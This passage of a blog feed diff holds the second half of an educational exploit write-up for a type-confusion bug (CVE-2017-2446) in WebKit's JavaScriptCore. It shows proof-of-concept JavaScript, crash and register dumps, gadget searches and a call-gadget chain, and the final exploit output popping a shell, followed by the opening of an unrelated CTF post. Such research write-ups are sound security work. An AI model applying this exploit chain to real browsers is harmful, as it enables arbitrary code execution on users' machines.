+&lt;span class="nx"&gt;q&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;call&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x77777777&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;This bug is very similar to our earlier bug and originally I was confused as to why it was a separate p0 bug. Both bugs manifest in the same way, by giving you a non-properly-typechecked reference to a function, however the root cause that makes the bugs possible is different. In the &lt;code&gt;appendMemcpy&lt;/code&gt; case this is due to a lack of checks on &lt;code&gt;use strict&lt;/code&gt; code. This appears to be a “regular” type confusion, unrelated to &lt;code&gt;use strict&lt;/code&gt;. These bugs, while different, are similar enough that they share a CVE and a fix.&lt;/p&gt;
+&lt;p&gt;So, with this understood can we use &lt;code&gt;Intl.DateTimeFormat&lt;/code&gt; usefully to exploit &lt;code&gt;jsc&lt;/code&gt;?&lt;/p&gt;
+&lt;h3 id="intldatetimeformat-crash"&gt;Intl.DateTimeFormat Crash&lt;/h3&gt;
+&lt;p&gt;What’s the outcome if we run that PoC?&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Thread 1 &amp;quot;jsc&amp;quot; received signal SIGSEGV, Segmentation fault.
+…
+$rdi   : 0xffff000077777777
+...
+ → 0x7ffff77a8960 &amp;lt;JSC::IntlDateTimeFormat::format(JSC::ExecState&amp;amp;,+0&amp;gt; cmp    BYTE PTR [rdi+0x18], 0x0
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Ok, so we’re treating a NaN boxed integer as an object. What if we pass it an object instead?&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;// ...&lt;/span&gt;
+&lt;span class="nx"&gt;q&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;call&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;&lt;span class="nx"&gt;a&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;Int64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;0x41414141&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)});&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Results in:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Thread 1 &amp;quot;jsc&amp;quot; received signal SIGSEGV, Segmentation fault.
+...
+$rdi   : 0x0000000000000008
+ ...
+ → 0x7ffff77a4833 &amp;lt;JSC::IntlDateTimeFormat::initializeDateTimeFormat(JSC::ExecState&amp;amp;,+0&amp;gt; mov    eax, DWORD PTR [rdi]
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Hmm.. this also doesn’t look immediately useful. As a last ditch attempt, reading the docs we notice there is a both an &lt;code&gt;Intl.DateTimeFormat&lt;/code&gt; and an &lt;code&gt;Intl.NumberFormat&lt;/code&gt; with a similar &lt;code&gt;format&lt;/code&gt; call. Let’s try getting a reference to that function instead:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nx"&gt;load&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;utils.js&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="nx"&gt;load&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;int64.js&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+
+&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;Intl&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;NumberFormat&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;q&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+
+&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;f&lt;/span&gt;&lt;span class="p"&gt;(){&lt;/span&gt;
+        &lt;span class="nx"&gt;q&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;f&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;caller&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+
+
+&lt;span class="nx"&gt;i&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;format&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;&lt;span class="nx"&gt;valueOf&lt;/span&gt; &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;f&lt;/span&gt;&lt;span class="p"&gt;});&lt;/span&gt;
+
+&lt;span class="nx"&gt;q&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;call&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;&lt;span class="nx"&gt;a&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;Int64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;0x41414141&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)});&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Giving us:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Thread 1 &amp;quot;jsc&amp;quot; received signal SIGSEGV, Segmentation fault.
+…
+$rax   : 0x0000000041414141
+…
+ → 0x7ffff4b7c769 &amp;lt;unum_formatDouble_57+185&amp;gt; call   QWORD PTR [rax+0x48]
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Yeah, we can probably exploit this =p&lt;/p&gt;
+&lt;p&gt;I’d like to say that finding this was due to a deep reading and understanding of WebKit’s internationalization code, but really I was just trying things at random until something crashed in a useful looking state. I’m sure I tried dozens of other things that didn’t end up working out along the way... From a pedagogical perspective, I’m aware that listing random things I tried is not exactly optimal, but that’s actually how I did it so :)&lt;/p&gt;
+&lt;h3 id="exploit-planning"&gt;Exploit Planning&lt;/h3&gt;
+&lt;p&gt;Let’s pause to take stock of where we’re at:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;We have an arbitrary infoleak&lt;/li&gt;
+&lt;li&gt;We have a relative write and no good way to expand it to an arbitrary write&lt;/li&gt;
+&lt;li&gt;We have control over the program counter&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Using the infoleak we can find pretty much anything we want, thanks to linux loader behavior (&lt;code&gt;libc.so.6&lt;/code&gt; and thus &lt;code&gt;system()&lt;/code&gt; will always be at a fixed offset from &lt;code&gt;libJavaScriptCore.so&lt;/code&gt; which we already have the base address of leaked). A “proper” exploit would take a arbitrary shellcode and result in it’s execution, but we can settle with popping a shell.&lt;/p&gt;
+&lt;p&gt;The ideal case here would be we have control over &lt;code&gt;rdi&lt;/code&gt; and can just point &lt;code&gt;rip&lt;/code&gt; at &lt;code&gt;system()&lt;/code&gt; and we’d be done. Let’s look at the register state where we hijack control flow, with pretty printing from &lt;a href="https://twitter.com/_hugsy"&gt;@_hugsy&lt;/a&gt;’s excellent &lt;a href="https://github.com/hugsy/gef"&gt;gef&lt;/a&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$rax   : 0x0000000041414141
+$rbx   : 0x0000000000000000
+$rcx   : 0x00007fffffffd644  →  0xb2de45e000000000
+$rdx   : 0x00007fffffffd580  →  0x00007ffff4f14d78  →  0x00007ffff4b722d0  →  &amp;lt;icu_57::FieldPosition::~FieldPosition()+0&amp;gt; lea rax, [rip+0x3a2a91]        # 0x7ffff4f14d68 &amp;lt;_ZTVN6icu_5713FieldPositionE&amp;gt;
+$rsp   : 0x00007fffffffd570  →  0x7ff8000000000000
+$rbp   : 0x00007fffffffd5a0  →  0x00007ffff54dfc00  →  0x00007ffff51f30e0  →  &amp;lt;icu_57::UnicodeString::~UnicodeString()+0&amp;gt; lea rax, [rip+0x2ecb09]        # 0x7ffff54dfbf0 &amp;lt;_ZTVN6icu_5713UnicodeStringE&amp;gt;
+$rsi   : 0x00007fffffffd5a0  →  0x00007ffff54dfc00  →  0x00007ffff51f30e0  →  &amp;lt;icu_57::UnicodeString::~UnicodeString()+0&amp;gt; lea rax, [rip+0x2ecb09]        # 0x7ffff54dfbf0 &amp;lt;_ZTVN6icu_5713UnicodeStringE&amp;gt;
+$rdi   : 0x00007fffb2d5c120  →  0x0000000041414141 (&amp;quot;AAAA&amp;quot;?)
+$rip   : 0x00007ffff4b7c769  →  &amp;lt;unum_formatDouble_57+185&amp;gt; call QWORD PTR [rax+0x48]
+$r8    : 0x00007fffffffd644  →  0xb2de45e000000000
+$r9    : 0x0000000000000000
+$r10   : 0x00007ffff35dc218  →  0x0000000000000000
+$r11   : 0x00007fffb30065f0  →  0x00007fffffffd720  →  0x00007fffffffd790  →  0x00007fffffffd800  →  0x00007fffffffd910  →  0x00007fffb3000000  →  0x0000000000000003
+$r12   : 0x00007fffffffd644  →  0xb2de45e000000000
+$r13   : 0x00007fffffffd660  →  0x0000000000000000
+$r14   : 0x0000000000000020
+$r15   : 0x00007fffb2d5c120  →  0x0000000041414141 (&amp;quot;AAAA&amp;quot;?)
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;So, &lt;code&gt;rax&lt;/code&gt; is fully controlled and &lt;code&gt;rdi&lt;/code&gt; and &lt;code&gt;r15&lt;/code&gt; are pointers to &lt;code&gt;rax&lt;/code&gt;. Nothing else seems particularly useful. The ideal case is probably out, barring some significant memory sprays to get memory addresses that double as useful strings. Let’s see if we can do it without &lt;code&gt;rdi&lt;/code&gt;.&lt;/p&gt;
+&lt;h3 id="one_gadget"&gt;one_gadget&lt;/h3&gt;
+&lt;p&gt;On linux, there is a handy tool for this by &lt;a href="https://twitter.com/david942j"&gt;@david924j&lt;/a&gt; called &lt;a href="https://github.com/david942j/one_gadget"&gt;one_gadget&lt;/a&gt;. &lt;code&gt;one_gadget&lt;/code&gt; is pretty straightforward in its use: you give it a libc, it gives you the offsets and constraints for PC values that will get you a shell. In my case:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;x@webkit:~$ one_gadget /lib/x86_64-linux-gnu/libc.so.6
+0x41bce execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
+constraints:
+  rax == NULL
+
+0x41c22 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
+constraints:
+  [rsp+0x30] == NULL
+
+0xe1b3e execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x60, environ)
+constraints:
+  [rsp+0x60] == NULL
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;So, we have three constraints, and if we can satisfy any one of them, we’re done. Obviously the first is out -- we take control of PC with a &lt;code&gt;call [rax+0x48]&lt;/code&gt; so &lt;code&gt;rax&lt;/code&gt; cannot be &lt;code&gt;NULL&lt;/code&gt;. So, now we’re looking at stack contents. Because nothing is ever easy, neither of the stack based constraints are met either. Since the easy solutions are out, let’s look at what we have in a little more detail.&lt;/p&gt;
+&lt;h3 id="memory-layout-and-rop"&gt;Memory layout and ROP&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;       +------------------+
+rax -&amp;gt; |0xdeadbeefdeadbeef|
+       +------------------+
+       |        ...       |
+       +------------------+
++0x48  |0x4141414141414141| &amp;lt;- new rip
+       +------------------+
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;To usefully take control of execution, we will need to construct an array with our target PC value at offset &lt;code&gt;+0x48&lt;/code&gt;, then call our type confusion with that value. Because we can construct &lt;code&gt;ArrayWithDouble&lt;/code&gt;’s arbitrary, this isn’t really a problem: populate the array, use our infoleak to find the array base, use that as the type confusion value.&lt;/p&gt;
+&lt;p&gt;A normal exploit path in this case will focus on getting a stack pivot and setting up a rop chain. In our case, if we wanted to try this the code we would need would be something like:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="no"&gt;X&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;rdi&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="c"&gt;; or r15&lt;/span&gt;
+&lt;span class="no"&gt;mov&lt;/span&gt; &lt;span class="no"&gt;Y&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;X&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;Y&lt;/span&gt;
+&lt;span class="nf"&gt;ret&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Where X and Y can be any register. While some code with these properties likely exists inside some of the mapped executable code in our address  space, searching for it would require some more complicated tooling than I was familiar with or felt like learning. So ROP is probably out for now.&lt;/p&gt;
+&lt;h3 id="reverse-gadgets"&gt;Reverse gadgets&lt;/h3&gt;
+&lt;p&gt;By this point we are very familiar with the fact that WebKit is C++, and C++ famously makes heavy use of function indirection much to the despair of reverse engineers and glee of exploit writers. Normally in a ROP chain we find snippets of code and chain them together, using &lt;code&gt;ret&lt;/code&gt; to transfer control flow between them but that won’t work in this case. However, what if we could leverage C++’s indirection to get us the ability to execute gadgets. In our specific current case, we’re taking control of PC on a &lt;code&gt;call [rax + 0x48]&lt;/code&gt;, with a fully controlled &lt;code&gt;rax&lt;/code&gt;. Instead of looking for gadgets that end in &lt;code&gt;ret&lt;/code&gt;, what if we look for gadgets that end in &lt;code&gt;call [rax + n]&lt;/code&gt; and stitch them together.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;x@webkit:~$ objdump -M intel -d ~/WebKit/WebKitBuild/Release/lib/libJavaScriptCore.so \
+    | grep &amp;#39;call   QWORD PTR \[rax&amp;#39; \
+    | wc -l
+7214
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;7214 gadgets is not a bad playground to choose from. Obviously &lt;code&gt;objdump&lt;/code&gt; is not the best disassembler for this as it won’t find all instances (e.g. overlapping/misaligned instructions), but it should be good enough for our purposes. Let’s combine this idea with &lt;code&gt;one_gadget&lt;/code&gt; constraints. We need a series of gadgets that:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Zero a register&lt;/li&gt;
+&lt;li&gt;Write that register to &lt;code&gt;[rsp+0x28]&lt;/code&gt; or &lt;code&gt;[rsp+0x58]&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;All of which end in a &lt;code&gt;call [rax+n]&lt;/code&gt;, with each &lt;code&gt;n&lt;/code&gt; being unique&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Why &lt;code&gt;+0x28&lt;/code&gt; or &lt;code&gt;+0x58&lt;/code&gt; instead of &lt;code&gt;+0x30&lt;/code&gt; or &lt;code&gt;+0x60&lt;/code&gt; like &lt;code&gt;one_gadget&lt;/code&gt;’s output? Because the the final call into &lt;code&gt;one_gadget&lt;/code&gt; will push the next PC onto the stack, offsetting it by 8. With a little bit of grepping, this was surprisingly easy to find. We’re going to search backwards, first, let’s go for the stack write.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;x@webkit:~$ objdump -M intel -d ~/WebKit/WebKitBuild/Release/lib/libJavaScriptCore.so \
+    | grep -B1 &amp;#39;call   QWORD PTR \[rax&amp;#39; \
+    | grep -A1 &amp;#39;mov    QWORD PTR \[rsp+0x28\]&amp;#39;
+...
+  5f6705:       4c 89 44 24 28          mov    QWORD PTR [rsp+0x28],r8
+  5f670a:       ff 50 60                call   QWORD PTR [rax+0x60]
+...
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;This find us four unique results, with the one we’ll use being the only one listed. Cool, now we just need to find a gadget to zero &lt;code&gt;r8&lt;/code&gt;...&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;x@webkit:~$ objdump -M intel -d ~/WebKit/WebKitBuild/Release/lib/libJavaScriptCore.so \
+    | grep -B4 &amp;#39;call   QWORD PTR \[rax&amp;#39; \
+    | grep -A4 &amp;#39;xor    r8&amp;#39;
+…
+  333503:       45 31 c0                xor    r8d,r8d
+  333506:       4c 89 e2                mov    rdx,r12
+  333509:       48 89 de                mov    rsi,rbx
+  33350c:       ff 90 f8 00 00 00       call   QWORD PTR [rax+0xf8]
+...
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;For this one, we need to broaden our search a bit, but still find what we need without too much trouble (and have our choice of five results, again with the one we’ll use being the only one listed). Again, &lt;code&gt;objdump&lt;/code&gt; and &lt;code&gt;grep&lt;/code&gt; are not the best tool for this job, but if it’s stupid and it works…&lt;/p&gt;
+&lt;p&gt;One takeaway from this section is that &lt;code&gt;libJavaScriptCore&lt;/code&gt; is over 12mb of executable code, and this means your bigger problem is figuring what to look for as opposed to finding it. With that much code, you have an embarrassment of useful gadgets. In general, it made me curious as to the practical utility of fancy gadget finders on larger binaries (at least in case where the payloads don’t need to be dynamically generated).&lt;/p&gt;
+&lt;p&gt;In any case, we now have all the pieces we need to trigger and land our exploit.&lt;/p&gt;
+&lt;h2 id="putting-it-all-together"&gt;Putting it all together&lt;/h2&gt;
+&lt;p&gt;To finish this guy off, we need to construct our pseudo jump table. We know we enter into our chain with a &lt;code&gt;call [rax+0x48]&lt;/code&gt;, so that will be our first gadget, then we look at the offset of the call to determine the next one. This gives us a layout like this:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;       +------------------+
+rax -&amp;gt; |0xdeadbeefdeadbeef|
+       +------------------+
+       |       ...        |
+       +------------------+
++0x48  |     zero r8      | &amp;lt;- first call, ends in call [rax+0xf8]
+       +------------------+
+       |       ...        |
+       +------------------+
++0x60  |    one gadget    | &amp;lt;- third call, gets us our shell
+       +------------------+
+       |       ...        |
+       +------------------+
++0xf8  |    write stack   | &amp;lt;- second call, ends in call [rax+0x60]
+       +------------------+
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We construct this array using normal JS, then just chase pointers from leaks we have until we find the array. In my implementation I just used a magic 8 byte constant which I searched for, effectively performing a big &lt;code&gt;memmem()&lt;/code&gt; on the heap. Once it’s all lined up, the dominoes fall and &lt;code&gt;one_gadget&lt;/code&gt; gives us our shell :)&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;x@webkit:~/babys-first-webkit$ ./jsc zildjian.js
+setting up ghetto_memcpy()...
+done:
+function () {
+    [native code]
+}
+
+setting up read primitives...
+done.
+
+leaking string addr...
+string @ 0x00007feac5b96814
+
+leaking jsc base...
+reading @ 0x00007feac5b96060
+libjsc .data leak: 0x00007feaca218f28
+libjsc .text @ 0x00007feac95e8000
+libc @ 0x00007feac6496000
+one gadget @ 0x00007feac64d7c22
+
+leaking butterfly arena...
+reading @ 0x00007feac5b95be8
+buttefly arena leak: 0x00007fea8539eaa0
+
+searching for butterfly in butterfly arena...
+butterfly search base: 0x00007fea853a8000
+found butterfly @ 0x00007fea853a85f8
+
+replacing array search tag with one shot gadget...
+setting up take_rip...
+done:
+function format() {
+    [native code]
+}
+setting up call target: 0x00007fea853a85b0
+getting a shell... enjoy :)
+$ id
+uid=1000(x) gid=1000(x) groups=1000(x),27(sudo)
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The exploit is here: &lt;a href="https://gist.github.com/yrp604/5ef4996357e78da237be3727808174a0"&gt;zildjian.js&lt;/a&gt;. Be warned that while it seems to be 100% deterministic, it is incredibly brittle and includes a bunch of offsets that are specific to my box. Instead of fixing the exploit to make it general purpose, I opted to provide all the info for you to do it yourself at home :)&lt;/p&gt;
+&lt;p&gt;If you have any questions, or if you have suggestions for better ways to do anything, be it exploit specifics or general approaches please (really) drop me a line on Twitter or IRC. As the length of this article might suggest, I’m happy to discuss this to death, and one of my hopes in writing this all down is that someone will see me doing something stupid and correct me.&lt;/p&gt;
+&lt;h2 id="conclusion"&gt;Conclusion&lt;/h2&gt;
+&lt;p&gt;With the exploit working, let’s reflect on how this was different from common CTF problems. There are two difference which really stand out to me:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;The bug is more subtle than a typical CTF problem. This makes sense, as CTF problems are often meant to be understood within a ~48 hour period, and when you can have bigger/more complex systems you have more opportunity for mistakes like these.&lt;/li&gt;
+&lt;li&gt;CTF problems tend to scale up difficulty by giving worse exploit primitives, rather than harder bugs to find. We’ve all seen contrived problems where you get execution control in an address space with next to nothing in it, and need to MacGyver your way out. While this can be a fun and useful exercise, I do wish there were good ways to include the other side of the coin.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Some final thoughts:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;This was significantly harder than I expected. I went in figuring I would have some fairly localized code, find a heap smash, relative write, or UaF and be off to the races. While that may be true for some browser bugs, in this case I needed a deeper understanding of browser internals. My suspicion is that this was not the easiest bug to begin browser exploitation with, but on the upside it was very… educational.&lt;/li&gt;
+&lt;li&gt;Most of the work here was done over a ~3 month period in my free time. The initial setup and research to get a working infoleak took just over a month, then I burned over a month trying to find a way to get an arbitrary write out of &lt;code&gt;fastMalloc&lt;/code&gt;. Once I switched to &lt;code&gt;Intl.NumberFormat&lt;/code&gt; I landed the exploit quickly.&lt;/li&gt;
+&lt;li&gt;I was surprised by how important object layouts were for exploitation, and how relatively poor the tooling was for finding and visualizing objects that could be instantiated and manipulated from the runtime.&lt;/li&gt;
+&lt;li&gt;With larger codebases such as this one, when dealing with an unknown component or function call I had the most consistent success balancing an approach of guessing what I viewed as likely behavior and reading and understanding the code in depth. I found it was very easy to get wrapped up in guessing how something worked because I was being lazy and didn’t want to read the code, or alternatively to end up reading and understanding huge amounts of code that ended up being irrelevant to my goals. &lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Most of these points boil down to “more code to understand makes it more work to exploit”. Like most problems, once you understand the components the solution is fairly simple. With a larger codebase the most time by far was spent reading and playing with the code to understand it better.&lt;/p&gt;
+&lt;p&gt;I hope you’ve enjoyed this writeup, it would not have been possible without significant assistance from a bunch of people. Thanks to &lt;a href="https://twitter.com/natashenka"&gt;@natashenka&lt;/a&gt; for the bugs, &lt;a href="https://twitter.com/agustingianni"&gt;@agustingianni&lt;/a&gt; for answering over a million questions, &lt;a href="https://twitter.com/5aelo"&gt;@5elo&lt;/a&gt; and &lt;a href="https://twitter.com/_niklasb"&gt;@_niklasb&lt;/a&gt; for the Phrack article and entertaining my half-drunk questions during CanSec respectively, &lt;a href="https://twitter.com/0vercl0k"&gt;@0vercl0k&lt;/a&gt; who graciously listened to me rant about butterflies at least twenty times, &lt;a href="https://twitter.com/itszn13"&gt;@itszn13&lt;/a&gt; who is definitely the the best RPISEC alumnus of all time, and &lt;a href="https://twitter.com/mongobug"&gt;@mongobug&lt;/a&gt; who provided helpful ideas and shamed me into finishing exploit and writeup.&lt;/p&gt;</content><category term="JavascriptCore"></category><category term="jsc"></category><category term="cve-2017-2446"></category><category term="exploitation"></category></entry><entry><title>Breaking ledgerctf's AES white-box challenge</title><link href="/blog/2018/05/17/breaking-ledgerctfs-aes-white-box-challenge/" rel="alternate"></link><published>2018-05-17T11:52:00-07:00</published><updated>2018-05-17T11:52:00-07:00</updated><author><name>Axel "0vercl0k" Souchet</name></author><id>tag:None,2018-05-17:/blog/2018/05/17/breaking-ledgerctfs-aes-white-box-challenge/</id><summary type="html">&lt;h1 id="introduction"&gt;Introduction&lt;/h1&gt;
 &lt;p&gt;About a month ago, my mate &lt;a href="https://twitter.com/b0n0n"&gt;b0n0n&lt;/a&gt; was working on the &lt;a href="https://www.ledger.fr/ctf2018/"&gt;ledgerctf&lt;/a&gt; puzzles and challenged me to have a look at the &lt;em&gt;ctf2&lt;/em&gt; binary. I eventually did and this blogpost discusses the protection scheme and how I broke it. Before diving in though, here is a bit of background.&lt;/p&gt;
 &lt;p&gt;&lt;a href="https://www.ledger.fr/"&gt;ledger&lt;/a&gt; is a french security company founded in 2014 that is specialized in cryptography, cryptocurrencies, and hardware. They recently put up online three different puzzles to celebrate the official launch of their &lt;a href="https://www.ledger.fr/bounty-program/"&gt;bug bounty program&lt;/a&gt;. The second challenge called &lt;em&gt;ctf2&lt;/em&gt; is the one we will be discussing today. &lt;em&gt;ctf2&lt;/em&gt; is an ELF64 binary that is available &lt;a href="https://drive.google.com/open?id=1UPLe3V5Jt3SMqZe4ZIFcnWydSqUyI4Ao"&gt;here&lt;/a&gt; for download (if you want to follow at home). The binary is about 11MB, written in C++ and even has symbols; great.&lt;/p&gt;
 &lt;p&gt;Let's do it!&lt;/p&gt;
